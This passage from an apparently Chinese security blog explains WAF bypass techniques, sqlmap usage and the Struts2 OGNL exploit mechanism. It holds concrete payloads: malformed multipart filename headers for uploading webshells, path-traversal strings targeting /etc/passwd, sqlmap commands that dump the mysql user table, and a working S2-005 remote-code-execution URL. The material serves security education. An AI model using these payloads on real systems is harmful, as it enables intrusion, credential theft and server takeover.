<h6 id="1-协议解析不一致-文件名解析兼容性"><a href="#1-协议解析不一致-文件名解析兼容性" class="headerlink" title="1.协议解析不一致-文件名解析兼容性"></a>1.协议解析不一致-文件名解析兼容性</h6><p>multipart协议中，文件名的形式为”filename=”abc.php””。但是Tomcat、PHP等容器解析协议时会做一些兼容，能正确解析 “filename=”abc.php”、”filename=abc.php”、 “filename=’abc.php’”。而WAF只按照协议标准去解析，无法解析文件名，但是后端容器能正确获得文件名，从而导致被绕过。场景的绕过形式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Content-Disposition: form-data; name=<span class="string">"file"</span>; filename=bc.php</div><div class="line">Content-Disposition: form-data; name=<span class="string">"file"</span>; filename=<span class="string">"abc.php</span></div><div class="line">Content-Disposition: form-data; name="file<span class="string">"; filename='abc.php'</span></div></pre></td></tr></table></figure></p>
<h6 id="2-协议解析不正确-未解析所有文件"><a href="#2-协议解析不正确-未解析所有文件" class="headerlink" title="2.协议解析不正确-未解析所有文件"></a>2.协议解析不正确-未解析所有文件</h6><p>multipart协议中，一个POST请求可以同时上传多个文件。如图，许多WAF只检查第一个上传文件，没有检查上传的所有文件，而实际后端容器会解析所有上传的文件名，攻击者只需把paylaod放在后面的文件PART，即可绕过。</p>
<h6 id="3-协议解析不正确-文件名覆盖"><a href="#3-协议解析不正确-文件名覆盖" class="headerlink" title="3.协议解析不正确-文件名覆盖"></a>3.协议解析不正确-文件名覆盖</h6><p>在multipart协议中，一个文件上传块存在多个Content-Disposition，将以最后一个Content-Disposition的filename值作为上传的文件名。许多WAF解析到第一个Content-Disposition就认为协议解析完毕，获得上传的文件名，从而导致被绕过。如图，加速乐的WAF解析得到文件名是”sp.pho”，但PHP解析结果是”sp.php”，导致被绕过。<br><img src="/upload_image/7.jpg" alt=""></p>
<h6 id="4-变换位置"><a href="#4-变换位置" class="headerlink" title="4.变换位置"></a>4.变换位置</h6><p>因为WebServer获取参数的灵活性，所以我尝试把安全狗拦截的filename=”test.asp”换个位置。经过一番测试，发现filename=”test.asp”位于Content-Type: application/octet-stream<br>下一行时，安全狗的上传拦截便会失效。</p>
<h6 id="5-文件名覆盖"><a href="#5-文件名覆盖" class="headerlink" title="5.文件名覆盖"></a>5.文件名覆盖</h6><p>在一个Content-Disposition 中，存在多个filename ，协议解析应该使用最后的filename值作为文件名。如果WAF解析到filename=”p3.txt”认为解析到文件名，结束解析，将导致被绕过。因为后端容器解析到的文件名是t3.jsp。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Disposition: form-data;name=<span class="string">"myfile"</span>; filename=<span class="string">"p3.txt"</span>;filename=<span class="string">"t3.jsp"</span></div></pre></td></tr></table></figure></p>
<h6 id="6-遗漏文件名"><a href="#6-遗漏文件名" class="headerlink" title="6.遗漏文件名"></a>6.遗漏文件名</h6><p>当WAF遇到”name=”myfile”;;”时，认为没有解析到filename。而后端容器继续解析到的文件名是t3.jsp，导致WAF被绕过。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Disposition: form-data;name=<span class="string">"myfile"</span>;; filename=<span class="string">"t3.jsp"</span></div></pre></td></tr></table></figure></p>
<h6 id="7-任意文件下载"><a href="#7-任意文件下载" class="headerlink" title="7.任意文件下载"></a>7.任意文件下载</h6><p>（1）相对路径：所以WAF文件包含规则通常会检测连续的”../“。根据vfs解析路径的语法，解析到”//“文件路径不变，解析到”/./“文件路径依然。 通过避免连续的”../“，从而绕过WAF文件包含规则。Eg: ././..///./.././/../etc//passwd，它等价于../../../etc/passwd。<br>（2）绝对路径：例如 /etc/./passwd 与 /etc/passwd 是等价的。还可以通过组合”/./“、”//“进行绕过，<br>Eg.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/etc///.//././/passwd</div><div class="line">/etc/passwd   /etc././././passwd</div></pre></td></tr></table></figure></p>
<h4 id="代码级WAF"><a href="#代码级WAF" class="headerlink" title="代码级WAF"></a>代码级WAF</h4><p>所谓代码级的WAF是指程序员在程序内部，借助自身编写的过滤函数来保护应用程序的安全。以下是三种脚本语言通常会使用的过滤位置：</p>
<h6 id="1-php"><a href="#1-php" class="headerlink" title="1. php"></a>1. php</h6><p>在php.ini中设置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">; Automatically add files before PHP document.; auto-prepend-fileauto_prepend_file =; Automatically add files after PHP document.; auto-append-fileauto_append_file =</div></pre></td></tr></table></figure></p>
<p>配置指令，这些指令指向那些在每个请求的PHP脚本执行”之前”和”之后”才执行的PHP文件。这样就可以在各种HTTP请求集合(GET,POST,COOKIE)之前对数据进行一些前发处理。</p>
<h6 id="2-asp-net"><a href="#2-asp-net" class="headerlink" title="2.asp.net"></a>2.asp.net</h6><p>通过ASP.NET的System.Web.IHttpModule接口来实现</p>
<h6 id="3-java"><a href="#3-java" class="headerlink" title="3.java"></a>3.java</h6><p>通过filter来实现。比如tomcat会在web.xml的配置文件中配置过滤类。</p>
<h4 id="绕过基于规则的WAF"><a href="#绕过基于规则的WAF" class="headerlink" title="绕过基于规则的WAF"></a>绕过基于规则的WAF</h4><p>目前市面的大部分WAF是通过规则来实现的，既然是规则，就一定存在不全面、不准确的情况。下面举几个例子帮助大家拓展一下思路：</p>
<h6 id="1-封禁IP"><a href="#1-封禁IP" class="headerlink" title="1.封禁IP"></a>1.封禁IP</h6><p>比如有些waf会对重复的IP访问进行封锁,这时可以用在请求包体中加入  “X-Originating-IP:127.0.0.1”，因为waf不会拦截他自己。</p>
<h6 id="2-前端waf"><a href="#2-前端waf" class="headerlink" title="2.前端waf"></a>2.前端waf</h6><p>针对于前端的waf,可以直接通过burp抓包绕过</p>
<h6 id="3-改变user-agent"><a href="#3-改变user-agent" class="headerlink" title="3.改变user-agent"></a>3.改变user-agent</h6><p>我们在写网站防火墙规则的时候可能都会做一件事:永远不屏蔽那些主流搜索引擎机器人的爬取(如,Google,Bing,Yahoo,Baidu等).这时我们就可以在USER-Agent伪造自己是搜索引擎的爬虫，绕过waf.</p>
<h6 id="4-缓冲区溢出"><a href="#4-缓冲区溢出" class="headerlink" title="4.缓冲区溢出"></a>4.缓冲区溢出</h6><p>比如waf只允许长度是2M的包体，而服务器则可以接受8M的包体，这种情况 可以通过发送2M-8M的包体将WAF溢出死。</p>
<h6 id="5-替换关键字"><a href="#5-替换关键字" class="headerlink" title="5.替换关键字"></a>5.替换关键字</h6><p>需要考虑waf具体怎么拦截的，Seleselectct,倘若将中间的关键字删掉，则可以绕过。</p>
<h6 id="6-webserver特性"><a href="#6-webserver特性" class="headerlink" title="6.webserver特性"></a>6.webserver特性</h6><p>iis 自动忽略%<br>我们知道asp有两个特性<br>1.会将Request中的不能编码部分的%去掉<br>2.Request中如果有unicode部分会将其进行解码<br>IIS6.0两个解析缺陷：目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析。<br>Apache1.X 2.X解析漏洞：<br>Apache在以上版本中，解析文件名的方式是从后向前识别扩展名，直到遇见Apache可识别的扩展名为止。<br>Nginx解析漏洞：</p>
<p>Nginx 0.5.<em>Nginx 0.6.</em>Nginx 0.7 &lt;= 0.7.65Nginx 0.8 &lt;= 0.8.37，以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg.php进行请求。<br>Nginx 0.8.41 – 1.5.6：以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg%20.php进行请求。<br>PHP CGI解析漏洞 : IIS 7.0/7.5 和 Nginx &lt; 0.8.3 以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析。<br>参数污染：比如waf只接受前一个参数这意味着，通过注入: id=7&amp;id=[SQLi]WAF的网络层会解析 id=7 ,合法PHP应用层会解析 id=[SQLi] 注入语句成功执行。</p>
<h6 id="7-数据库特性"><a href="#7-数据库特性" class="headerlink" title="7.数据库特性"></a>7.数据库特性</h6><p>mysql：<br>1.隐形类型转换<br>2.为了便利性 牺牲安全性。（select <em> from admin where user=”Admin”   可以执行，  mysql为了 使用的便利性 会允许一些 ‘错误’，比如 select </em> from admin where user=” À dmin” 依然可移执行。<br>3.MySQL文件读取<br>(5.5以上的版本  由于secure_file_priv这个变量为null 因此无法使用文件读取  文件写入的功能。)</p>
<h6 id="8-服务器特性"><a href="#8-服务器特性" class="headerlink" title="8.服务器特性"></a>8.服务器特性</h6><p>NTFS ADS特性：ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。<br>Windows在创建文件时，在文件名末尾不管加多少点都会自动去除，那么上传时filename可以这么写shell.php……也可以这么写shell.php::$DATA…….。<br>总结：本文主要对基于规则的WAF的绕过技巧，基于规则的waf有着天然的缺陷型，构造出基于规则之外的特性就有可能绕过。或者干脆将WAF直接打挂，这时waf很有可能直接启用Bypass模式。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2016/09/18/WAF-Bypass-技巧总结/" data-id="cj5p9bvxm0009d01bvpd0t5dq" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-sqlmap-使用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/08/11/sqlmap-使用/" class="article-date">
  <time datetime="2016-08-11T03:28:48.000Z" itemprop="datePublished">2016-08-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/08/11/sqlmap-使用/">sqlmap 使用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>sqlmap 是进行sql注入首选的工具，它可以帮助你快速的验证和利用一个sql注入漏洞。你可以在sqlmap的帮助下轻松的利用sql注入漏洞获取数据库数据甚至是getshell。<br>下载安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/sqlmapproject/sqlmap.git</div></pre></td></tr></table></figure></p>
<p>当然，你也可以下载zip包直接解压，地址<a href="https://codeload.github.com/sqlmapproject/sqlmap/legacy.zip/master" target="_blank" rel="external">https://codeload.github.com/sqlmapproject/sqlmap/legacy.zip/master</a><br>然后解压出来目录其实就可以直接使用了。<br>大部分人只需要这么用<br>直接对一个url进行注入检测,-u参数指定检测的url<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php?user=jack&amp;id=1"</span></div></pre></td></tr></table></figure></p>
<p>如果是post的参数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span></div></pre></td></tr></table></figure></p>
<p>ok，如果输入的参数过多，你可以使用-p来指定具体存在注入的参数，比如指定参数id注入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id</div></pre></td></tr></table></figure></p>
<p>下一步，获取数据库列表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id --dbs</div></pre></td></tr></table></figure></p>
<p>获取指定数据库的表名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id --D mysql --tables</div></pre></td></tr></table></figure></p>
<p>获取指定数据库及指定表的列名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id --D mysql -T user --columns</div></pre></td></tr></table></figure></p>
<p>dump数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id --D mysql -T user --dump</div></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2016/08/11/sqlmap-使用/" data-id="cj5p9bvxl0008d01bhmioaraa" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-OGNL机制和Struts2漏洞利用原理研究" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/08/08/OGNL机制和Struts2漏洞利用原理研究/" class="article-date">
  <time datetime="2016-08-08T07:56:31.000Z" itemprop="datePublished">2016-08-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/08/08/OGNL机制和Struts2漏洞利用原理研究/">OGNL机制和Struts2漏洞利用原理研究</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>在MVC开发框架中，数据会在MVC各个模块中进行流转。而这种流转，也就会面临一些困境，就是由于数据在不同MVC层次中表现出不同的形式和状态而造成的：</p>
<h5 id="View层—表现为字符串展示"><a href="#View层—表现为字符串展示" class="headerlink" title="View层—表现为字符串展示"></a>View层—表现为字符串展示</h5><p>数据在页面上是一个扁平的、不带数据类型的字符串，无论数据结构有多复杂，数据类型有多丰富，到了展示的时候，全都一视同仁的成为字符串在页面上展现出来。数据在传递时，任何数据都都被当作字符串或字符串数组来进行。</p>
<h5 id="Controller层—表现为java对象"><a href="#Controller层—表现为java对象" class="headerlink" title="Controller层—表现为java对象"></a>Controller层—表现为java对象</h5><p>在控制层，数据模型遵循java的语法和数据结构，所有的数据载体在Java世界中可以表现为丰富的数据结构和数据类型，你可以自行定义你喜欢的类，在类与类之间进行继承、嵌套。我们通常会把这种模型称之为复杂的对象树。数据在传递时，将以对象的形式进行。<br>可以看到，数据在不同的MVC层次上，扮演的角色和表现形式不同，这是由于HTTP协议与java的面向对象性之间的不匹配造成的。如果数据在页面和Java世界中互相传递，就会显得不匹配。所以也就引出了几个需要解决的问题：<br>1．当数据从View层传递到Controller层时，我们应该保证一个扁平而分散在各处的数据集合能以一定的规则设置到Java世界中的对象树中去。同时，能够灵活的进行由字符串类型到Java中各个类型的转化。<br>2．当数据从Controller层传递到View层时，我们应该保证在View层能够以某些简易的规则对对象树进行访问。同时，在一定程度上控制对象树中的数据的显示格式。<br>我们稍微深入思考这个问题就会发现，解决数据由于表现形式的不同而发生流转不匹配的问题对我们来说其实并不陌生。同样的问题会发生在Java世界与数据库世界中，面对这种对象与关系模型的不匹配，我们采用的解决方法是使用如hibernate，iBatis等框架来处理java对象与关系数据库的匹配。<br>现在在Web层同样也发生了不匹配，所以我们也需要使用一些工具来帮助我们解决问题。为了解决数据从View层传递到Controller层时的不匹配性，Struts2采纳了XWork的一套完美方案。并且在此的基础上，构建了一个完美的机制，从而比较完美的解决了数据流转中的不匹配性。就是表达式引擎OGNL。它的作用就是帮助我们完成这种规则化的表达式与java对象的互相转化(以上内容参考自Struts2 技术内幕)。</p>
<h3 id="OGNL"><a href="#OGNL" class="headerlink" title="OGNL"></a>OGNL</h3><p>OGNL（Object Graph Navigation Language）即对象图形导航语言，是一个开源的表达式引擎。使用OGNL，你可以通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化。如果我们把表达式看做是一个带有语义的字符串，那么OGNL无疑成为了这个语义字符串与Java对象之间沟通的桥梁。我们可以轻松解决在数据流转过程中所遇到的各种问题。<br>OGNL进行对象存取操作的API在Ognl.java文件中，分别是getValue、setValue两个方法。getValue通过传入的OGNL表达式，在给定的上下文环境中，从root对象里取值：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">public static Object getValue(Object tree, Map context, Object root) throws OgnlException</div><div class="line">&#123;</div><div class="line">    <span class="built_in">return</span> getValue(tree, context, root, null);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>setValue通过传入的OGNL表达式，在给定的上下文环境中，往root对象里写值:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">public static void setValue(String expression, Map context, Object root, Object value)</div><div class="line">    throws OgnlException</div><div class="line">&#123;</div><div class="line">    setValue(parseExpression(expression), context, root, value);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>OGNL同时编写了许多其它的方法来实现相同的功能，详细可参考Ognl.java代码。OGNL的API很简单，无论何种复杂的功能，OGNL会将其最终映射到OGNL的三要素中通过调用底层引擎完成计算，OGNL的三要素即上述方法的三个参数expression、root、context。</p>
<h4 id="OGNL三要素"><a href="#OGNL三要素" class="headerlink" title="OGNL三要素"></a>OGNL三要素</h4><h5 id="Expression-表达式-："><a href="#Expression-表达式-：" class="headerlink" title="Expression(表达式)："></a>Expression(表达式)：</h5><p>Expression规定OGNL要做什么，其本质是一个带有语法含义的字符串,这个字符串将规定操作的类型和操作的内容。OGNL支持的语法非常强大，从对象属性、方法的访问到简单计算，甚至支持复杂的lambda表达式。</p>
<h5 id="Root-根对象-："><a href="#Root-根对象-：" class="headerlink" title="Root(根对象)："></a>Root(根对象)：</h5><p>OGNL的root对象可以理解为OGNL要操作的对象，表达式规定OGNL要干什么，root则指定对谁进行操作。OGNL的root对象实际上是一个java对象，是所有OGNL操作的实际载体。</p>
<h5 id="Context-上下文"><a href="#Context-上下文" class="headerlink" title="Context(上下文):"></a>Context(上下文):</h5><p>有了表达式和根对象，已经可以使用OGNL的基本功能了。例如，根据表达式对root对象进行getvalue、setvalue操作。<br>不过事实上在OGNL内部，所有的操作都会在一个特定的数据环境中运行，这个数据环境就是OGNL的上下文。简单说就是上下文将规定OGNL的操作在哪里进行。<br>OGNL的上下文环境是一个MAP结构，定义为OgnlContext，root对象也会被添加到上下文环境中，作为一个特殊的变量进行处理。</p>
<h4 id="OGNL基本操作"><a href="#OGNL基本操作" class="headerlink" title="OGNL基本操作"></a>OGNL基本操作</h4><h5 id="对root对象的访问："><a href="#对root对象的访问：" class="headerlink" title="对root对象的访问："></a>对root对象的访问：</h5><p>针对OGNL的root对象的对象树的访问是通过使用‘点号’将对象的引用串联起来实现的。通过这种方式，OGNL实际上将一个树形的对象结构转化为一个链式结构的字符串来表达语义，如下：<br>//获取root对象中的name属性值<br>name<br>//获取root对象department属性中的name属性值<br>department.name<br>//获取root对象department属性中的manager属性中的name属性值<br>department.manager.name</p>
<h5 id="对上下文环境的访问"><a href="#对上下文环境的访问" class="headerlink" title="对上下文环境的访问"></a>对上下文环境的访问</h5><p>Context上下文是一个map结构，访问上下文参数时需要通过#符号加上链式表达式来进行，从而表示与访问root对象的区别，如下：<br>//获取上下文环境中名为introduction的对象的值<br>introduction<br>//获取上下文环境中名为parameters的对象中的user对象中名为name属性的值<br>#parameters.user.name</p>
<h5 id="对静态变量、方法的访问"><a href="#对静态变量、方法的访问" class="headerlink" title="对静态变量、方法的访问"></a>对静态变量、方法的访问</h5><p>在OGNL中，对于静态变量、方法的访问通过@[class]@[field/method]访问，这里的类名要带着包名。如下<br>//访问com.example.core.Resource类中名为img的属性值<br>@com.example.core.Resource@img<br>//调用com.example.core.Resource类中名为get的方法<br>@com.example.core.Resource@get()</p>
<h5 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h5><p>//调用root对象中的group属性中users的size()方法<br>group.users.size()<br>//调用root对象中group中的containsUser方法，并传递上下文环境中名为user值作为参数<br>group.containsUser(#user)</p>
<h5 id="构造对象"><a href="#构造对象" class="headerlink" title="构造对象"></a>构造对象</h5><p>OGNL支持直接通过表达式来构造对象，构造的方式主要包括三种：<br>1．构造List：使用{}，中间使用逗号隔开元素的方式表达列表<br>2．构造map：使用#{},中间使用逗号隔开键值对，并使用冒号隔开key和value<br>3．构造对象：直接使用已知的对象构造函数来构造对象<br>可以看到OGNL在语法层面上所表现出来的强大之处，不仅能够直接对容器对象构造提供语法层面支持，还能够对任意java对象提供支持。然而正因为OGNL过于强大，它也造成了诸多安全问题。恶意攻击者通过构造特定数据带入OGNL表达式解析并执行，而OGNL可以用来获取和设置Java对象的属性，同时也可以对服务端对象进行修改，所以只要绕过沙盒恶意攻击者甚至可以执行系统命令进行系统攻击。</p>
<h4 id="深入OGNL实现类"><a href="#深入OGNL实现类" class="headerlink" title="深入OGNL实现类"></a>深入OGNL实现类</h4><p>在OGNL三要素中，context上下文环境为OGNL提供计算运行的环境，这个运行环境在OGNL内部由OgnlContext类实现，它是一个map结构。在OGNL.java中可以看到OgnlContext会在OGNL计算时动态创建，同时传入map结构的context，并根据传入的参数设定OGNL计算的一些默认行为以及设置root对象。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">public static Map addDefaultContext(Object root, ClassResolver classResolver, TypeConverter converter, MemberAccess memberAccess, Map context)</div><div class="line">&#123;</div><div class="line">    OgnlContext result;</div><div class="line">    <span class="keyword">if</span> (!(context instanceof OgnlContext))</div><div class="line">    &#123;</div><div class="line">        result = new OgnlContext();</div><div class="line">        result.setValues(context);</div><div class="line">    &#125; <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        result = (OgnlContext) context;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (classResolver != null)</div><div class="line">    &#123;</div><div class="line">        result.setClassResolver(classResolver);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (converter != null)</div><div class="line">    &#123;</div><div class="line">        result.setTypeConverter(converter);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (memberAccess != null)</div><div class="line">    &#123;</div><div class="line">        result.setMemberAccess(memberAccess);</div><div class="line">    &#125;</div><div class="line">    result.setRoot(root);</div><div class="line">    <span class="built_in">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里看到MemberAccess属性，在struts2漏洞利用中经常看到。转到OgnlContext类中查看。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">public static final MemberAccess DEFAULT_MEMBER_ACCESS = new DefaultMemberAccess( <span class="literal">false</span> );</div></pre></td></tr></table></figure></p>
<p>MemberAccess指定OGNL的对象属性、方法访问策略，这里初始默认情况下是flase，即默认不允许访问。在struts2中SecurityMemberAccess类封装了DefaultMeberAccess类并进行了扩展，指定是否支持访问静态方法以及通过指定正则表达式来规定某些属性是否能够被访问。其中allowStaticMethodAccess默认为flase，即默认禁止访问静态方法。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">public SecurityMemberAccess(boolean method) &#123;</div><div class="line">    super(<span class="literal">false</span>);</div><div class="line">    allowStaticMethodAccess = method;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>另外在OGNL实现了MethodAccessor及PropertyAccessor类规定OGNL在访问方法和属性时的实现方式，详细可参考代码文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">public interface MethodAccessor &#123;</div><div class="line">    callMethod(Map&lt;String,Object&gt; context, Object target, String methodName, Object[] args)</div><div class="line">    callStaticMethod(Map&lt;String,Object&gt; context, Class&lt;?&gt; targetClass, String methodName, Object[] args)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在struts2中，XWorkMethodAccessor类对MethodAccessor进行了封装，其中在callStaticMethod方法中可以看到，程序首先从上下文获取到DENY_METHOD_EXECUTION值并转换为布尔型，如果为false则可以执行静态方法，如果为true则不执行静态发放并返回null。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">@Override</div><div class="line">public Object callStaticMethod(Map context, Class aClass, String string, Object[] objects) throws MethodFailedException &#123;</div><div class="line">    Boolean <span class="built_in">exec</span> = (Boolean) context.get(ReflectionContextState.DENY_METHOD_EXECUTION);</div><div class="line">    boolean e = ((<span class="built_in">exec</span> == null) ? <span class="literal">false</span> : exec.booleanValue());</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (!e) &#123;</div><div class="line">        <span class="built_in">return</span> callStaticMethodWithDebugInfo(context, aClass, string, objects);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">return</span> null;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="Struts2漏洞利用原理"><a href="#Struts2漏洞利用原理" class="headerlink" title="Struts2漏洞利用原理"></a>Struts2漏洞利用原理</h4><p>上文已经详细介绍了OGNL引擎，因为OGNL过于强大，它也造成了诸多安全问题。恶意攻击者通过构造特定数据带入OGNL表达式即可能被解析并执行，而OGNL可以用来获取和设置Java对象的属性，同时也可以对服务端对象进行修改，所以只要绕过Struts2的一些安全策略，恶意攻击者甚至可以执行系统命令进行系统攻击。如struts2远程代码执行漏洞s2-005。<br>虽然Struts2出于安全考虑，在SecurityMemberAccess类中通过设置禁止静态方法访问及默认禁止执行静态方法来阻止代码执行。即上面提及的denyMethodExecution为true，MemberAccess为false。但这两个属性都可以被修改从而绕过安全限制执行任意命令。s2-005 POC如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://mydomain/MyStruts.action?(<span class="string">'\u0023_memberAccess[\'</span>allowStaticMethodAccess\<span class="string">']'</span>)(meh)=<span class="literal">true</span>&amp;(aaa)((<span class="string">'\u0023context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\u003d\u0023foo'</span>)(\u0023foo\u003dnew%20java.lang.Boolean(<span class="string">"false"</span>)))&amp;(asdf)((<span class="string">'\u0023rt.exec(‘ipconfig’)'</span>)(\u0023rt\[email]u003d@java.lang.Runt[/email]ime@getRuntime()))=1</div></pre></td></tr></table></figure></p>
<p>在POC中\u0023是因为S2-003对#号进行了过滤，但没有考虑到unicode编码情况，而通过#_memberAccess[\’allowStaticMethodAccess\’]’)(meh)=true，可以设置允许访问静态方法，因为getRuntime方法是静态的，通过context[\’xwork.MethodAccessor.denyMethodExecution\’]=#foo’)(#foo=new%20java.lang.Boolean(“false”)设置拒绝执行方法为false，也就是允许执行静态方法。最后调用rt.exec(‘ipconfig’)执行任意命令。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2016/08/08/OGNL机制和Struts2漏洞利用原理研究/" data-id="cj5p9bvxe0005d01b7u35d75s" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-Spring-Boot框架SPEL表达式注入漏洞" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/" class="article-date">
  <time datetime="2016-07-15T07:42:14.000Z" itemprop="datePublished">2016-07-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/">Spring Boot框架SPEL表达式注入漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>pring是2003年兴起的轻量级Java开发框架。任何Java应用都可以使用该框架的核心特性，在Java EE平台之上有可用于构建Web应用的扩展。Spring Boot是Spring 的一个核心子项目，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置国内包括百度、阿里巴巴、腾讯等诸多知名企业都在使用该框架。<br>最近Spring Boot框架的SpEL表达式注入通用漏洞曝光，利用该漏洞，远程攻击者在服务器上可执行任意命令。</p>
<h4 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h4><p>Spring Boot 1.1 1.2 1.3.0版本</p>
